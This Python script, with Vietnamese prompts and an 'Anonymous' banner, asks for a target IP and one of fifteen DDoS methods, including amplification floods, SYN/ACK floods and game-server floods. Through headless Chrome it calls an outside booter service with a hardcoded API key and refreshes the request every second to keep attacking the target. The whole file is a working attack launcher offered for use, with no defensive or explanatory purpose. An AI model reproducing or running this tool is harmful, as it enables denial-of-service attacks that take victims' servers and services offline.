from selenium import webdriver
import time
import os,sys
os.system("cls")
#Colour
yellow='\033[93m'
gren='\033[92m'
cyan='\033[96m'
pink='\033[95m'
red='\033[91m'
b='\033[1m'
##############

os.system("clear")
print("""\033[93m
             __      ANONYMOUS       _____
            / /  __ _ _   _  ___ _  |___  |
           / /  / _` | | | |/ _ \ '__| / /
          / /__| (_| | |_| |  __/ |   / /
          \____/\__,_|\__, |\___|_|  /_/
                      |___/
                 ADDED NEW METHOD 
               DDoS Layer7 (DDoS) 💥
""")
print()
ip=input("[×]  IP: => ")
print('   Các Phương Thức Method:')
print('   1. AMP-NTP')
print('   2. AMP-DNS')
print('   3. AMP-DVR (High PPS)')
print('   4. AMP-SSDP (High PPS)')
print('   5. AMP-SNMP (High PPS)')
print('   6. TCP-SYN (High PPS)')
print('   7. TCP-ACK (High PPS)')
print('   8. TCP-AMP (SYN-ACK amplification)')
print('   9. TCP-BYPASS')
print('   10. UDP-MIX (UDP with mixed protocols)')
print('   11. UDP-BYPASS (Sending random data)')
print('   12. VALVE (TSource Engine Flood)')
print('   13. Game-FiveM (Custom FiveM Payloads)')
print('   14. OVH-AMP (Mix of amplifications flood)')
print('   15. OVH-TCP')
print('')
method=input("   Vui Lòng Chọn Method: ")
options=webdriver.ChromeOptions()	
options.add_argument("--incognito")
options.add_argument("--headless")
options.add_argument("start-maximized")
driver=webdriver.Chrome(options=options)
if method == "1":
	driver.get(f"https://anonboot.net/?key=zblvvQwDWgDWA1yX&host={ip}&port=80&time=800&method=Anon-NTP&format=html")
elif method == "2":
	driver.get(f"https://anonboot.net/?key=zblvvQwDWgDWA1yX&host={ip}&port=80&time=800&method=Anon-DNS&format=html")
elif method == "3":
	driver.get(f"https://anonboot.net/?key=zblvvQwDWgDWA1yX&host={ip}&port=80&time=800&method=Anon-DVR&format=html")
elif method == "4":
	driver.get(f"https://anonboot.net/?key=zblvvQwDWgDWA1yX&host={ip}&port=80&time=800&method=Anon-SSDP&format=html")
elif method == "5":
	driver.get(f"https://anonboot.net/?key=zblvvQwDWgDWA1yX&host={ip}&port=80&time=800&method=Anon-SNMP&format=html")
elif method == "6":
	driver.get(f"https://anonboot.net/?key=zblvvQwDWgDWA1yX&host={ip}&port=80&time=800&method=Anon_TCP_SYN&format=html")
elif method == "7":
	driver.get(f"https://anonboot.net/?key=zblvvQwDWgDWA1yX&host={ip}&port=80&time=800&method=Anon_TCP_ACK&format=html")
elif method == "8":
	driver.get(f"https://anonboot.net/?key=zblvvQwDWgDWA1yX&host={ip}&port=80&time=800&method=Anon_TCP_AMP&format=html")
elif method == "9":
	driver.get(f"https://anonboot.net/?key=zblvvQwDWgDWA1yX&host={ip}&port=80&time=800&method=Anon_TCP_BY&format=html")
elif method == "10":
	driver.get(f"https://anonboot.net/?key=zblvvQwDWgDWA1yX&host={ip}&port=80&time=800&method=Anon_UDP_MIX&format=html")
elif method == "11":
	driver.get(f"https://anonboot.net/?key=zblvvQwDWgDWA1yX&host={ip}&port=80&time=800&method=Anon_UDP_BY&format=html")
elif method == "12":
	driver.get(f"https://anonboot.net/?key=zblvvQwDWgDWA1yX&host={ip}&port=80&time=800&method=Anon_VALVE&format=html")
elif method == "13":
	driver.get(f"https://anonboot.net/?key=zblvvQwDWgDWA1yX&host={ip}&port=80&time=800&method=Anon_FiveM&format=html")
elif method == "14":
	driver.get(f"https://anonboot.net/?key=zblvvQwDWgDWA1yX&host={ip}&port=80&time=800&method=Anon_OVH_AMP&format=html")
elif method == "15":
	driver.get(f"https://anonboot.net/?key=zblvvQwDWgDWA1yX&host={ip}&port=80&time=800&method=Anon_OVH_TCP&format=html")													
else:
	exit()
while True:
 driver.refresh()
 os.system("cls")
 print(f"Đang Tấn Công IP: {ip}")
 time.sleep(1)
